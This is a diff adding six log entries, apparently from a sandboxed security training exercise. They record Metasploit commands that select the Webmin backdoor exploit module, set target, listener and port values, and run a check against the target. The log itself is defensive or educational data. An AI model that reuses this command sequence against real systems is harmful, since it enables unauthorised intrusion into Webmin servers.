@@ -1,0 +1,6 @@
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T21:02:37.855895+02:00", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T21:02:45.271694+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T21:02:50.308553+02:00", "cmd_type": "msf-command", "cmd": "set RHOST 172.18.1.5"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T21:02:55.933531+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T21:03:04.705296+02:00", "cmd_type": "msf-command", "cmd": "set RPORT 10000"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T21:03:08.642697+02:00", "cmd_type": "msf-command", "cmd": "check"}
